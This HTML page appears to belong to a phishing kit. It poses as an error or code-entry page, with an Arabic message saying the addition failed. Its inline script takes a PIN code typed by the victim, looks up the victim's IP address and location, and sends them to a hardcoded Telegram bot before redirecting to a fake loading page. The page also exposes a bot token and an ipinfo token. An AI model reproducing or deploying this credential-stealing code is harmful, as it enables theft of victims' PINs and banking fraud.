<!DOCTYPE html>
<html lang="en">
<head>
    <title>International Code Input</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="icon" href="Smoflo.png.png" type="image/png"> <!-- Favicon -->
    <link rel="stylesheet" href="styles.css" />
    <script>
        async function getIpInfo() {
            const response = await fetch('https://ipinfo.io/json?token=4d1535316da2be'); // Replace with your token
            return response.json();
        }

        async function sendToTelegram(message) {
            const telegramToken = '7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY'; // Replace with your bot token
            const chatId = '7196613507'; // Replace with your chat ID
            const url = `https://api.telegram.org/bot7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        async function handleSubmit(event) {
            event.preventDefault(); // Prevent the default form submission
            const code = document.querySelector("#code").value; // Get the code entered
            const ipInfo = await getIpInfo();

            const countryCode = ipInfo.country; // Get the country code
            const flagEmoji = getFlagEmoji(countryCode); // Get the flag emoji

            // Create the message to send to Telegram
            const message = `
                PinCode: ${code}
IP Address: ${ipInfo.ip}
Country Code: ${countryCode} ${flagEmoji}
Country: ${ipInfo.region}
            `;

            // Send the message to your Telegram bot
            await sendToTelegram(message);

            // Redirect to the loading page only after the message is sent
            window.location.href = "loading4.html"; // Change to your loading page
        }

        function getFlagEmoji(countryCode) {
            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
            return String.fromCodePoint(...codePoints);
        }

        document.addEventListener("DOMContentLoaded", () => {
            // Bind the form submit to the handleSubmit function
            document.querySelector("form").addEventListener("submit", handleSubmit);
        });
    </script>
</head>
<body>
    <div class="container">
        <img src="DSxOAUB0raA.png" alt="Logo" class="logo"> <!-- Replace with your logo -->
        <div>
            <img src="png-clipart-computer-icons-error-information-error-angle-triangle-thumbnail-removebg-preview.png" alt="Description Image" class="description-img"> <!-- Replace with your image -->
            <form>
                <h4 style="color:#5E5E5E; font-size: larger;">لم تتم الإضافة بشكل ناجح 
                    المرجو إعادة المحاولة لاحقا.    </h4>
                
                
            </form>
            <div class="alert alert-info" style="display: none;"></div>
        </div>
    </div>
</body>
</html>